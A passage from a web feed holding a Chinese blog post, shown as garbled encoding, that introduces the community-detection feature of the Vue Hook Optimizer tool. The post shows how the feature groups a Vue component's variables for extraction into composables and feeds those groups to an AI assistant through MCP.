#ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ç”¨äº† <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzcf0508%2Fvue-hook-optimizer" target="_blank" title="https://github.com/zcf0508/vue-hook-optimizer" ref="nofollow noopener noreferrer">Vue Hook Optimizer</a> å’Œ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzcf0508%2Fvue-hook-optimizer%2Ftree%2Fmaster%2Fpackages%2Fmcp" target="_blank" title="https://github.com/zcf0508/vue-hook-optimizer/tree/master/packages/mcp" ref="nofollow noopener noreferrer">MCP</a> ä¸€æ®µæ—¶é—´ä»¥åï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªæœ‰è¶£çš„ç°è±¡ï¼š</p>
<p><strong>AI çš„å»ºè®®ç¡®å®ä¸é”™ï¼Œä½†æ€»æ„Ÿè§‰å®ƒåœ¨"çè’™"ã€‚</strong></p>
<p>æ¯”å¦‚ï¼Œå®ƒä¼šå‘Šè¯‰æˆ‘"è¿™äº›å˜é‡åº”è¯¥æå–ä¸ºä¸€ä¸ª Composable"ï¼Œä½†åˆ°åº•æ˜¯æå–å“ªå‡ ä¸ªï¼Ÿå“ªäº›åº”è¯¥åˆ†å¼€ï¼ŸAI ç»™çš„ç­”æ¡ˆçœ‹èµ·æ¥æœ‰é“ç†ï¼Œä½†æˆ‘è¿˜æ˜¯ä¼šçº ç»“â€”â€”è¿™æ ·åˆ†å¯¹ä¸å¯¹ï¼Ÿæœ‰æ²¡æœ‰æ›´å¥½çš„æ–¹å¼ï¼Ÿ</p>
<p>åæ¥æˆ‘æ„è¯†åˆ°é—®é¢˜åœ¨å“ªäº†ï¼š<strong>AI çœ‹åˆ°äº†ä»£ç çš„ä¾èµ–å…³ç³»ï¼Œä½†å®ƒä¸çŸ¥é“æˆ‘å¿ƒé‡Œæ˜¯æ€ä¹ˆæƒ³çš„ã€‚</strong> å®ƒéœ€è¦æ›´å¤šçš„"çº¿ç´¢"æ¥ç†è§£æˆ‘çš„é‡æ„æ€è·¯ã€‚</p>
<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦<strong>ç¤¾åŒºåˆ’åˆ†ï¼ˆCommunity Detectionï¼‰</strong> è¿™ä¸ªåŠŸèƒ½ã€‚</p>
<h2 data-id="heading-0">ä»€ä¹ˆæ˜¯"ç¤¾åŒºåˆ’åˆ†"ï¼Ÿè¯´å¾—å¾ˆç®€å•</h2>
<p>æˆ‘å¸¸å¸¸è¿™æ ·æƒ³è±¡ï¼šæŠŠä½ çš„ä»£ç çœ‹æˆä¸€ä¸ªå¤§çš„åŠå…¬å®¤ã€‚</p>
<p>åˆçœ‹èµ·æ¥ï¼Œæ¯ä¸ªäººéƒ½åœ¨å¿™è‡ªå·±çš„äº‹å„¿ã€‚ä½†ä½ ä»”ç»†è§‚å¯Ÿä»¥åï¼Œä¼šå‘ç°ï¼š</p>
<ul>
<li>æœ‰äº›äººç»å¸¸èšåœ¨ä¸€èµ·è®¨è®ºï¼Œä»–ä»¬ä¸€ç›´åœ¨åˆä½œ</li>
<li>æœ‰äº›äººè™½ç„¶ååœ¨åŒä¸€ä¸ªåŠå…¬å®¤ï¼Œä½†å…¶å®å„å¹²å„çš„äº‹å„¿</li>
<li>æœ‰äº›äººç»å¸¸åœ¨ä¸åŒçš„å°ç»„ä¹‹é—´è·‘æ¥è·‘å»</li>
</ul>
<p>å¦‚æœä½ æ˜¯å›¢é˜Ÿçš„è´Ÿè´£äººï¼Œä½ ä¼šæ€ä¹ˆåšï¼ŸæŠŠè¿™äº›"ç»å¸¸åœ¨ä¸€èµ·çš„äºº"åˆ’åˆ†æˆå‡ ä¸ªå°ç»„ä¼šæ—¶ä¸€ä¸ªå¥½ä¸»æ„ï¼š</p>
<ul>
<li>å°ç»„å†…éƒ¨æ²Ÿé€šå¿«ï¼Œå·¥ä½œæ•ˆç‡é«˜</li>
<li>æ¯ä¸ªå°ç»„çš„èŒè´£æ¸…æ™°ï¼Œä¸ä¼šä¹±å¥—</li>
<li>å‡ºé—®é¢˜äº†ï¼Œä¸€çœ¼å°±èƒ½çœ‹å‡ºæ˜¯å“ªä¸ªå°ç»„çš„äº‹å„¿</li>
</ul>
<p><strong>å†™ä»£ç ä¹Ÿæ˜¯è¿™ä¸ªé“ç†ã€‚</strong></p>
<p>ä½ ç»„ä»¶é‡Œçš„å˜é‡å’Œå‡½æ•°ï¼Œå®ƒä»¬ä¹‹é—´ä¹Ÿæœ‰ç±»ä¼¼çš„"æŠ±å›¢ç°è±¡"ã€‚<code>isOpen</code> å’Œ <code>handleOpenChange</code> é€šå¸¸ä¼šä¸€èµ·å‡ºç°ï¼ŒæŸäº›å‡½æ•°ä¾èµ–ç‰¹å®šçš„æ•°æ®ã€‚Vue Hook Optimizer çš„<strong>ç¤¾åŒºåˆ’åˆ†åŠŸèƒ½</strong>ï¼Œå°±æ˜¯è‡ªåŠ¨æ‰¾å‡ºè¿™äº›"ç»å¸¸æ··åœ¨ä¸€èµ·çš„å˜é‡å’Œå‡½æ•°ç¾¤ä½“"ï¼Œç„¶åç»™ä½ å±•ç¤ºå‡ºæ¥ã€‚</p>
<h2 data-id="heading-1">ä»"å‘ç°é—®é¢˜"åˆ°"ç†è§£ç»“æ„"</h2>
<p>å‰ä¸¤ç¯‡æ–‡ç« å’±ä»¬è®²è¿‡ï¼š</p>
<ol>
<li><a href="https://juejin.cn/post/7345796354957737994" target="_blank" title="https://juejin.cn/post/7345796354957737994">æˆ‘æ˜¯è¿™æ ·é‡æ„å’Œä¼˜åŒ–ç»„ä»¶çš„</a>ï¼šä»‹ç»äº†å¦‚ä½•å‘ç°ä»£ç çš„é—®é¢˜ï¼ˆæ¯”å¦‚æ²¡ç”¨çš„å˜é‡ã€å¥—å¨ƒå‡½æ•°ã€ä¹±ä¸ƒå…«ç³Ÿçš„è€¦åˆï¼‰</li>
<li><a href="https://juejin.cn/post/7481463851298603059" target="_blank" title="https://juejin.cn/post/7481463851298603059">Vue Hook Optimizer + AI: æ¢ç´¢ Vue ç»„ä»¶ä»£ç ä¼˜åŒ–çš„æ–°å¢ƒç•Œ</a>ï¼šä»‹ç»æ•´ä¸ªå·¥å…·é“¾ï¼Œå°¤å…¶æ˜¯ MCP å’Œ AI æ€ä¹ˆå¸®ä½ ä¼˜åŒ–ä»£ç </li>
</ol>
<p>ä½†è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼š<strong>å½“ AI è¯´"å»ºè®®æå–ä¸º Composable"çš„æ—¶å€™ï¼Œå®ƒå…¶å®æ˜¯åœ¨ççŒœã€‚</strong></p>
<p>AI èƒ½çœ‹åˆ°ä»£ç çš„ä¾èµ–å…³ç³»ï¼Œä½†å®ƒä¸çŸ¥é“ä½ å¿ƒé‡Œæ€ä¹ˆæƒ³çš„ã€‚ä½ è®¤ä¸ºå“ªäº›ä»£ç "å¤©ç”Ÿå°±åº”è¯¥åœ¨ä¸€èµ·"ï¼ŒAI è¦ä¸€ä¸ªä¸€ä¸ªåœ°è¯•ã€‚</p>
<p><strong>ç°åœ¨æœ‰äº†ç¤¾åŒºåˆ’åˆ†åŠŸèƒ½ä»¥åï¼Œä¸ä¸€æ ·äº†ã€‚</strong> å®ƒç»™ä½ å±•ç¤ºäº†ä»£ç çš„"è‡ªç„¶åˆ†ç•Œçº¿"ã€‚</p>
<ol>
<li>ä¸€çœ¼çœ‹æ¸…å“ªäº›å˜é‡å’Œå‡½æ•°å…³ç³»æ¯”è¾ƒç´§å¯†</li>
<li>ç›´è§‚ç†è§£ä»£ç çš„å†…éƒ¨é€»è¾‘åˆ†ç»„</li>
<li>ç„¶åå‘Šè¯‰ AIï¼š"ä½ åº”è¯¥è¿™æ ·åˆ†"</li>
</ol>
<h2 data-id="heading-2">VSCode é‡Œçš„ç¤¾åŒºæ ‘è§†å›¾</h2>
<p>åœ¨æœ€æ–°çš„æ‰©å±•ä¸­æ–°å¢äº†<strong>ç¤¾åŒºæ ‘è§†å›¾</strong>åŠŸèƒ½ã€‚å½“ä½ æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œå·¦è¾¹ä¼šå‡ºç°ä¸ª**ã€ŒVariable Communitiesã€** é¢æ¿ã€‚é‡Œé¢æ˜¯ä¸ªæ ‘å½¢ç»“æ„ã€‚</p>
<h3 data-id="heading-3">é•¿ä»€ä¹ˆæ ·å­</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c859d453ecb4f2d88ed5320f0eba363~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaHVhbGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767592205&amp;x-signature=vVEjtT7VaDux%2B2lxgHgwAnZdXtQ%3D" alt="image.png" loading="lazy"/></p>
<p><strong>æ¯ä¸€ä¸ª Community å°±æ˜¯ä¸€ä¸ª"ç´§å¯†ç›¸å…³"çš„å°å›¢ä½“ã€‚</strong> è¡¨ç¤ºå®ƒä»¬ä¹‹é—´è”ç³»æ¯”è¾ƒå¤šï¼š</p>
<ul>
<li>ç»å¸¸ä¸€èµ·å‡ºç°</li>
<li>ä¸€ä¸ªå˜äº†ï¼Œå…¶ä»–çš„ä¹Ÿè·Ÿç€å˜</li>
<li>é€šå¸¸éƒ½æ˜¯åœ¨å¹²åŒä¸€ä»¶äº‹å„¿</li>
</ul>
<h3 data-id="heading-4">ç‚¹ä¸€ä¸‹è¯•è¯•ï¼šäº¤äº’å¼é«˜äº®</h3>
<p>ä½ å¯ä»¥æ‰“å¼€é¢æ¿å³ä¸Šè§’çš„ community colors åŠŸèƒ½å¼€å…³ï¼Œå½“ä½ ç‚¹å‡»æŸä¸ª Community æˆå‘˜æ—¶ï¼ŒVSCode å°±ä¼šç”¨åŒä¸€ç§é¢œè‰²<strong>æŠŠè¿™ä¸ªç¤¾åŒºé‡Œçš„æ‰€æœ‰ä»£ç é«˜äº®å‡ºæ¥</strong>ã€‚</p>
<p>è¿™ä¸ªåŠŸèƒ½çœŸçš„å¾ˆçˆ½ï¼Œå› ä¸ºï¼š</p>
<ol>
<li><strong>ä¸€ç›®äº†ç„¶</strong> - é‚£äº›æ•£è½åœ¨ä»£ç å„ä¸ªè§’è½çš„ä¸œè¥¿ï¼Œçªç„¶å°±ä¸²åœ¨ä¸€èµ·äº†ï¼Œä½ èƒ½çœ‹å‡ºå®ƒä»¬ç¡®å®éƒ½æ˜¯ä¸€å›äº‹å„¿</li>
<li><strong>å‘ç°æ„å¤–çš„å…³è”</strong> - æœ‰æ—¶ä½ ä¼šå‘ç°ï¼Œåå­—çœ‹èµ·æ¥æ²¡å•¥å…³ç³»çš„å˜é‡ï¼Œå…¶å®åœ¨èƒŒåéƒ½æ˜¯ä¸€ä¸ªå®¶æ—ã€‚ï¼ˆæ¯”å¦‚ <code>isOpen</code> å’Œ <code>handleOpenChange</code>ï¼Œè™½ç„¶ä¸€ä¸ªæ˜¯çŠ¶æ€ï¼Œä¸€ä¸ªæ˜¯å¤„ç†å‡½æ•°ï¼Œä½†å®ƒä»¬å°±æ˜¯å¤©ç”Ÿä¸€å¯¹ï¼‰</li>
<li><strong>é‡æ„å˜å¾—æœ‰åº•æ°”</strong> - ä¸ç”¨å†çº ç»“"è¿™äº›åº”è¯¥æ”¾åœ¨ä¸€èµ·å—ï¼Ÿ"äº†ï¼Œé«˜äº®ç»™äº†ä½ ç­”æ¡ˆ</li>
</ol>
<h2 data-id="heading-5">ä¸€ä¸ªçœŸå®çš„ä¾‹å­</h2>
<p>å‡è®¾ä½ æœ‰ä¸ªç»„ä»¶ï¼Œä»£ç é•¿è¿™æ ·ï¼š</p>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup lang="ts"&gt;
// ä¸€å¨ï¼Œä»€ä¹ˆéƒ½æ··åœ¨ä¸€èµ·
const count = ref(0);
const searchText = ref('');
const searchList = ref([]);
const isSearching = ref(false);
const isDialogOpen = ref(false);
const apiData = ref(null);
const dialogTitle = ref('');

const doubleCount = computed(() =&gt; count.value * 2);
const increment = () =&gt; count.value++;

function handleOpenDialog() { isDialogOpen.value = true; }
function handleCloseDialog() { isDialogOpen.value = false; }

async function loadApiData() { /* ... */ }
function processApiData(data) { /* ... */ }

// è¿˜æœ‰æ›´å¤š...
&lt;/script&gt;

&lt;template&gt;
  &lt;div&gt;
    &lt;input v-model="searchText"&gt;
    &lt;button @click="handleOpenDialog"&gt;
      Open
    &lt;/button&gt;
    &lt;div&gt;{{ doubleCount }}&lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;
</code></pre>
<p><strong>æ²¡æœ‰ç¤¾åŒºåˆ’åˆ†æ—¶ï¼Œä½ ä¼šçº ç»“ï¼š</strong></p>
<ul>
<li>æˆ‘åˆ°åº•è¯¥åˆ†æˆå‡ ä¸ª Composableï¼Ÿ2 ä¸ªï¼Ÿ3 ä¸ªï¼Ÿ</li>
<li>å“ªäº›ä¸œè¥¿åº”è¯¥åœ¨ä¸€èµ·ï¼Œå“ªäº›åº”è¯¥åˆ†å¼€ï¼Ÿ</li>
<li>è¿™äº›ä¸œè¥¿ä¹‹é—´çš„å…³è”ç¨‹åº¦æœ‰å¤šæ·±ï¼Ÿ</li>
</ul>
<p><strong>ç”¨äº†ç¤¾åŒºåˆ’åˆ†ä»¥åï¼Œæ ‘è§†å›¾å‘Šè¯‰ä½ ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss">Variable Communities
â”œâ”€â”€ Community <span class="hljs-number">1</span> (<span class="hljs-number">3</span> members) æœç´¢
â”‚   â”œâ”€â”€ searchText
â”‚   â”œâ”€â”€ searchList
â”‚   â””â”€â”€ isSearching
â”œâ”€â”€ Community <span class="hljs-number">2</span> (<span class="hljs-number">4</span> members) å¯¹è¯æ¡†
â”‚   â”œâ”€â”€ isDialogOpen
â”‚   â”œâ”€â”€ dialogTitle
â”‚   â”œâ”€â”€ handleOpenDialog
â”‚   â””â”€â”€ handleCloseDialog
â”œâ”€â”€ Community <span class="hljs-number">3</span> (<span class="hljs-number">3</span> members) è®¡æ•°
â”‚   â”œâ”€â”€ count
â”‚   â”œâ”€â”€ doubleCount
â”‚   â””â”€â”€ increment
â””â”€â”€ Community <span class="hljs-number">4</span> (<span class="hljs-number">3</span> members) API
    â”œâ”€â”€ apiData
    â”œâ”€â”€ loadApiData
    â””â”€â”€ processApiData
</code></pre>
<p><strong>ç°åœ¨å°±æ¸…æ¥šäº†ï¼š</strong></p>
<ol>
<li><strong>ä¸€å…± 4 ä¸ªç‹¬ç«‹çš„åŠŸèƒ½æ¨¡å—</strong>ï¼Œå¯ä»¥åˆ†åˆ«æå–</li>
<li><strong>ç‚¹å‡»æ¯ä¸ª Community çœ‹é«˜äº®ä»£ç </strong>ï¼Œç¡®è®¤è¿™å°±æ˜¯ä½ æƒ³è¦çš„åˆ†ç»„</li>
<li><strong>ç„¶åå‘Šè¯‰ AI</strong>ï¼š"æˆ‘çœ‹åˆ°äº† 4 ä¸ªç¤¾åŒºï¼Œæˆ‘æƒ³åˆ†åˆ«æå–ä¸º <code>useSearch</code>ã€<code>useDialog</code>ã€<code>useCounter</code> å’Œ <code>useApiData</code>ï¼Œå¸®æˆ‘ç”Ÿæˆä»£ç "</li>
</ol>
<h2 data-id="heading-6">è®© LLM çœŸæ­£è¯»æ‡‚ç»„ä»¶</h2>
<p>è¿™æ‰æ˜¯æœ€æœ‰æ„æ€çš„éƒ¨åˆ†ã€‚å½“æŠŠ MCP å’Œç¤¾åŒºåˆ’åˆ†ç»“åˆèµ·æ¥ï¼Œä¼šå‘ç”Ÿå•¥ï¼Ÿ</p>
<h3 data-id="heading-7">ä¼ ç»Ÿçš„å¥—è·¯ï¼ˆæ•ˆç‡ä½ï¼‰</h3>
<blockquote>
<p><strong>ä½ ï¼š</strong> "å¸®æˆ‘ä¼˜åŒ–è¿™ä¸ªç»„ä»¶å§"</p>
</blockquote>
<blockquote>
<p><strong>AIï¼š</strong> "æˆ‘çœ‹åˆ°å¯ä»¥æå– 5 ä¸ª Composableï¼Œå« <code>useA</code>, <code>useB</code>, ..."</p>
</blockquote>
<blockquote>
<p><strong>ä½ ï¼š</strong> "ç­‰ç­‰ï¼Œè¿™æ ·åˆ†ä¸å¯¹ï¼ŒA å’Œ B åº”è¯¥åœ¨ä¸€èµ·å•Š"</p>
</blockquote>
<blockquote>
<p><strong>AIï¼š</strong> "å“¦ï¼Œé‚£æˆ‘é‡æ–°ç»™ä½ æƒ³æƒ³..."</p>
</blockquote>
<blockquote>
<p><strong>ä½ ï¼š</strong> "å—¯...è¿˜æ˜¯ä¸å¤ªå¯¹..."</p>
</blockquote>
<p><strong>ç»“æœï¼š</strong> æ¥æ¥å›å›å‡ ä¸ªå›åˆæ‰èƒ½å®šä¸‹æ¥ã€‚</p>
<h3 data-id="heading-8">æ–°çš„å¥—è·¯ï¼ˆç›´æ¥å¿«ç‹ å‡†ï¼‰</h3>
<p>ç°åœ¨ mcp çš„è¿”å›ç»“æœä¸­ä¼šåŒ…å«ç¤¾åŒºåˆ’åˆ†çš„ä¿¡æ¯ï¼ŒAI ä¼šç›´æ¥æ ¹æ®è¿™äº›ä¿¡æ¯ç”Ÿæˆä»£ç ã€‚</p>
<blockquote>
<p><strong>ä½ ï¼š</strong> "å¸®æˆ‘ä¼˜åŒ–è¿™ä¸ªç»„ä»¶å§"</p>
</blockquote>
<blockquote>
<p><strong>AIï¼š</strong> "æˆ‘çœ‹åˆ° 4 ä¸ªç¤¾åŒºï¼Œæˆ‘æƒ³åˆ†åˆ«æå–ä¸º useSearchã€useDialog ç­‰ï¼Œä½ çœ‹æ€ä¹ˆåšï¼Ÿ"</p>
</blockquote>
<blockquote>
<p><strong>ä½ ï¼š</strong> "å¾ˆä¸é”™ï¼Œå°±æŒ‰ç…§è¿™ä¸ªåˆ’åˆ†"</p>
</blockquote>
<p><strong>ç»“æœï¼š</strong> AI ç”Ÿæˆçš„ä»£ç ä¼šéå¸¸ç²¾å‡†ï¼Œç¬¦åˆä½ çš„é¢„æœŸã€‚</p>
<h3 data-id="heading-9">ä¸ºä»€ä¹ˆå·®åˆ«è¿™ä¹ˆå¤§ï¼Ÿ</h3>
<p>è¯´ç™½äº†å°±ä¸€å¥è¯ï¼š<strong>AI å’Œä½ ç»ˆäºå¯¹ä¸Š"é¢‘é“"äº†ã€‚</strong></p>
<ul>
<li><strong>ä½ </strong> çœ‹ç€é«˜äº®ä»£ç ï¼ŒçœŸæ­£ç†è§£äº†ä»£ç çš„åˆ†ç•Œçº¿</li>
<li><strong>AI</strong> çœ‹ç€ç¤¾åŒºæ•°æ®ï¼Œå‡†ç¡®äº†è§£äº†ä½ çš„åˆ†å‰²æ–¹æ¡ˆ</li>
<li><strong>åŒæ–¹</strong> åŸºäºåŒä¸€ä»½ä¿¡æ¯èŠå¤©ï¼Œè‡ªç„¶å°±èƒ½è¾¾æˆå…±è¯†</li>
</ul>
<h3 data-id="heading-10">SKILL.md</h3>
<p>å¦‚æœä½ ä½¿ç”¨çš„æ˜¯æ”¯æŒ SKILL çš„ç¼–è¾‘å™¨æ¯”å¦‚ Claude Code æˆ–è€… VSCode ï¼Œé‚£å¼ºçƒˆæ¨èä½ å®‰è£… <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzcf0508%2Fvue-hook-optimizer%2Fblob%2Fmaster%2Fpackages%2Fmcp%2Frefactor_prompt_zh.md" target="_blank" title="https://github.com/zcf0508/vue-hook-optimizer/blob/master/packages/mcp/refactor_prompt_zh.md" ref="nofollow noopener noreferrer">ç»„ä»¶é‡æ„</a> SKILLã€‚ä½ åªéœ€è¦åœ¨å®‰è£… mcp åï¼Œå°†é“¾æ¥ä¸­çš„å†…å®¹å¤åˆ¶åˆ° <code>~/.claude/skills/vho-refactor/SKILL.md</code> ä¸­ã€‚åœ¨å’Œ llm æ²Ÿé€šæ—¶ï¼Œè¦æ±‚ä»–ä½¿ç”¨ vho-refactor æŠ€èƒ½åˆ†æå’Œé‡æ„ç»„ä»¶ã€‚</p>
<h2 data-id="heading-11">åŸç†æ¦‚è¿°</h2>
<p>ä½ å¯èƒ½å¥½å¥‡ï¼š<strong>Vue Hook Optimizer èƒŒåæ˜¯æ€ä¹ˆæ‰¾å‡ºè¿™äº›ç¤¾åŒºçš„ï¼Ÿ</strong></p>
<p>ç²—ç•¥è®²è®²ï¼š</p>
<ol>
<li><strong>å»ºç«‹å…³ç³»ç½‘</strong> - çœ‹ä»£ç é‡Œå“ªäº›å˜é‡äº’ç›¸ä¾èµ–ï¼Œå“ªäº›è¢«åŒä¸€ä¸ªåœ°æ–¹ä½¿ç”¨</li>
<li><strong>çœ‹åå­—çš„å«ä¹‰</strong> - åˆ†æå˜é‡åå­—æœ¬èº«çš„æ„æ€ã€‚æ¯”å¦‚ <code>isOpen</code> å’Œ <code>handleOpenChange</code> è™½ç„¶ä¸€ä¸ªæ˜¯çŠ¶æ€ï¼Œä¸€ä¸ªæ˜¯å¤„ç†å‡½æ•°ï¼Œä½†å®ƒä»¬åœ¨è¯­ä¹‰ä¸Šæ˜¯ç›¸å…³çš„</li>
<li><strong>è‡ªåŠ¨åˆ†ç»„</strong> - æ ¹æ®ä¸Šé¢ä¸¤ç‚¹ï¼Œæ‰¾å‡ºå…³è”åº¦æœ€é«˜çš„å˜é‡ç¾¤ä½“ï¼Œç»™å®ƒä»¬åˆ†åˆ°ä¸€ä¸ªç¤¾åŒºé‡Œ</li>
</ol>
<p><strong>ç±»æ¯”ä¸€ä¸‹ï¼š</strong> å°±åƒæ ¹æ®å…¬å¸é‡Œäººä»¬çš„æ²Ÿé€šé¢‘ç‡å’Œå…±åŒè¯é¢˜ï¼Œç³»ç»Ÿè‡ªåŠ¨æŠŠç›¸å…³çš„äººåˆ†åˆ°ä¸€ä¸ªå°ç»„ï¼Œä¸ç”¨ä½ æ‰‹åŠ¨æŒ‡å®šã€‚</p>
<p>å…³é”®æ˜¯ï¼Œè¿™å¥—ä¸œè¥¿ä¸ä»…çœ‹"ä»£ç çš„ä¾èµ–å…³ç³»"ï¼Œè¿˜çœ‹"ä»£ç çš„å«ä¹‰"ã€‚æ‰€ä»¥ç»“æœå¾€å¾€æ›´ç¬¦åˆäººçš„ç›´è§‰ï¼Œä¸æ˜¯å†·å†°å†°çš„çº¯é€»è¾‘åˆ†æã€‚</p>
<h2 data-id="heading-12">æ•´ä¸ªæµç¨‹æ˜¯å•¥æ ·çš„</h2>
<p>ç°åœ¨ä½ æœ‰äº†å®Œæ•´çš„é“¾è·¯ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">åˆ†æä»£ç     â†’  çœ‹ä¾èµ–å›¾    â†’  çœ‹ç¤¾åŒºæ ‘    â†’  å’Œ AI èŠå¤©    â†’  ç”Ÿæˆä»£ç 
<span class="hljs-code">    â†“             â†“              â†“              â†“              â†“
ç»Ÿè®¡é—®é¢˜    â†’  ç†è§£ç»“æ„    â†’  ç¡®è®¤åˆ†ç»„    â†’  ç²¾å‡†å»ºè®®      â†’  å¼€å§‹é‡æ„
</span></code></pre>
<ol>
<li><strong>åˆ†æ</strong> - æ‰¾å‡ºæœªç”¨çš„ä¸œè¥¿ã€å¥—å¨ƒå‡½æ•°ã€ä¹±ä¸ƒå…«ç³Ÿçš„è€¦åˆ</li>
<li><strong>å¯è§†åŒ–</strong> - çœ‹ä»£ç çš„ä¾èµ–å…³ç³»å’Œç¤¾åŒºåˆ†ç»„</li>
<li><strong>AI åŠ æŒ</strong> - å‘Šè¯‰ AI ä½ çš„æƒ³æ³•ï¼Œå®ƒç»™å‡ºç²¾å‡†æ–¹æ¡ˆ</li>
<li><strong>å¼€å¹²</strong> - æŒ‰ç…§ç¤¾åŒºåˆ’åˆ†æå– Composable æˆ– Custom Hook</li>
</ol>
<h2 data-id="heading-13">å°¾å·´</h2>
<p>ä»£ç ä¼˜åŒ–è¿™ä»¶äº‹ï¼Œæ²¡æœ‰ä»€ä¹ˆ"ä¸€é”®æå®š"çš„ã€‚éœ€è¦ä½ è‡ªå·±å»ç†è§£ï¼Œéœ€è¦ AI æ¥å¸®å¿™ï¼Œä¹Ÿéœ€è¦ä¸€ä¸ªå¥½çš„å¯è§†åŒ–å·¥å…·æ‰èƒ½çœŸæ­£çœ‹æ¸…æ¥šã€‚</p>
<p><strong>ç¤¾åŒºåˆ’åˆ†åŠŸèƒ½å°±æ˜¯é‚£æŠŠé’¥åŒ™ã€‚</strong> å®ƒè®©ä½ èƒ½ï¼š</p>
<ul>
<li>ä¸€çœ¼çœ‹ç©¿ä»£ç çš„"è‡ªç„¶åˆ†ç•Œ"</li>
<li>è®© AI æ‡‚ä½ çš„æƒ³æ³•</li>
<li>æœ‰ä¿¡å¿ƒåœ°åšå‡ºé‡æ„å†³ç­–</li>
</ul>
<p>å¦‚æœä½ å¯¹è¿™ä¸ªåŠŸèƒ½æ„Ÿå…´è¶£ï¼Œå¯ä»¥æ‰“å¼€ VSCodeï¼Œè£…ä¸Š <a href="https://link.juejin.cn?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dzcf0508.vue-hook-optimizer-ext" target="_blank" title="https://marketplace.visualstudio.com/items?itemName=zcf0508.vue-hook-optimizer-ext" ref="nofollow noopener noreferrer">Vue Hook Optimizer æ‰©å±•</a>ï¼Œæ‰¾ä¸€ä¸ªå¤æ‚çš„ç»„ä»¶ï¼Œè·‘ä¸€éåˆ†æã€‚</p>
<hr/>
<p>æ¬¢è¿æ¥ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzcf0508%2Fvue-hook-optimizer" target="_blank" title="https://github.com/zcf0508/vue-hook-optimizer" ref="nofollow noopener noreferrer">GitHub</a> æ Issue æˆ–è€…è®¨è®ºã€‚æˆ‘å¾ˆæƒ³å¬å¬ä½ ç”¨ç¤¾åŒºåˆ’åˆ†åŠŸèƒ½åçš„åé¦ˆï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[â°å‰ç«¯å‘¨åˆŠç¬¬446æœŸï¼ˆ2025å¹´12æœˆ22æ—¥â€“12æœˆ27æ—¥ï¼‰]]></title>    <link>https://juejin.cn/post/7589172193151500324</link>    <guid>https://juejin.cn/post/7589172193151500324</guid>    <pubDate>2025-12-30T02:43:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589172193151500324" data-draft-id="7589167105385824292" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" 